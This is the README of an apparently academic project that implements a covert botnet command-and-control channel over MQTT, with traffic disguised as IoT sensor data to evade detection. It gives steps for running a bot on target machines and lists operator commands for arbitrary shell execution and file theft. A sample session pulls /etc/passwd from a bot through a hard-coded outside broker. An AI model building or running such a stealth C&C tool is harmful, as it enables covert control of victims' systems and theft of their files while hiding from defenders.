# MQTT Stealth C&C (Command & Control)

This project implements a covert Command & Control (C&C) channel over the MQTT protocol. It is designed to evade detection by mimicking legitimate IoT sensor traffic on a public broker.

## Architecture

The system uses a **4-layer protocol stack** for reliable, encrypted communication:

```
┌─────────────────────────────────────────┐
│  ApplicationLayer (C&C)                 │  Commands & responses
├─────────────────────────────────────────┤
│  TransportLayer                         │  Compression + packet splitting
├─────────────────────────────────────────┤
│  EncryptionLayer                        │  AES-256 + sensor structure
├─────────────────────────────────────────┤
│  LinkLayer                              │  1s interval MQTT sending
└─────────────────────────────────────────┘
```

**Key Features:**
- **Large file transfers**: Automatic chunking and reassembly (50KB+ tested)
- **Compression**: zlib reduces payload size before transmission
- **MTU propagation**: Layers report available space for pluggable encodings
- **Periodic sending**: Both bots and controller send packets every 1s (configurable)

## Protocol Design and Steganography

### The Covert Channel

Packets mimic environmental sensor data:

```json
{
  "sensor_id": "sensor_8492",
  "temp": 24.5,
  "hum": 45.0,
  "bat": 98,
  "fingerprint": "a3f1... (encrypted payload)"
}
```

* **Visible Layer:** `sensor_id`, `temp`, `hum`, `bat` are randomized to look realistic
* **Hidden Payload:** Encrypted and stored in the `fingerprint` field

### Encryption and Key Derivation

**AES-256-CBC** encryption with dynamically derived keys:

* **Key Formula:** `Key = MD5(SALT + sensor_id + temp + hum + bat)`
* **Salt:** Pre-shared secret known only to bots and controller

**Security Features:**
* **Polymorphism:** Each packet has different sensor values = different encryption key
* **Confidentiality:** Without the Salt, the key cannot be derived
* **Obfuscation:** Payload hidden in plain sight as a "fingerprint"

## Requirements

```bash
pip install -r requirements.txt
```

Dependencies: `paho-mqtt`, `pycryptodome`

## How to Run

### 1. Start the Bot (on target machine)

```bash
python3 bot.py
```

Output: `[*] Bot sensor_XXXX listening (sending every 1.0s)...`

### 2. Start the Controller

```bash
python3 controller.py
```

### 3. Controller Commands

| Command | Description |
|---------|-------------|
| `ping` | Check if bots are alive |
| `w` | List logged-in users |
| `id` | Show user ID running the bot |
| `ls <dir>` | List directory contents |
| `exec <cmd>` | Execute arbitrary shell command |
| `copy <file>` | Read a file from the bot |
| `list` | Show discovered bots |
| `exit` | Quit the controller |

### 4. Targeting Specific Bots

By default, commands are sent to ALL bots. To target a specific bot:

```
C&C> ping                           # Discover all bots
[+] RESPONSE from sensor_5432: Pong
[+] RESPONSE from sensor_7891: Pong

C&C> list                           # See discovered bots
[*] Discovered bots (2):
    sensor_5432
    sensor_7891

C&C> @sensor_5432 copy /etc/passwd  # Target specific bot
[*] Command 'copy' sent to sensor_5432
```

## Testing

Run automated e2e tests (launches 3 bots automatically):

```bash
# Start MQTT broker first
docker run -it -p 1883:1883 eclipse-mosquitto

# Run tests
./venv/bin/python -m pytest test_e2e.py -v
```

Tests include:
- All commands (ping, w, ls, id, exec, copy)
- Large file transfers (10KB, 50KB+)
- Multi-bot targeting
- Chunking and reassembly

## Files

| File | Description |
|------|-------------|
| `protocol.py` | Layered protocol stack (shared by bot & controller) |
| `bot.py` | Agent running on target machines |
| `controller.py` | Command interface for operator |
| `test_e2e.py` | End-to-end tests |

## Configuration

| Setting | Default |
|---------|---------|
| Broker | 147.32.82.209 |
| Port | 1883 |
| Topic | sensors |
| Send Interval | 1.0s |
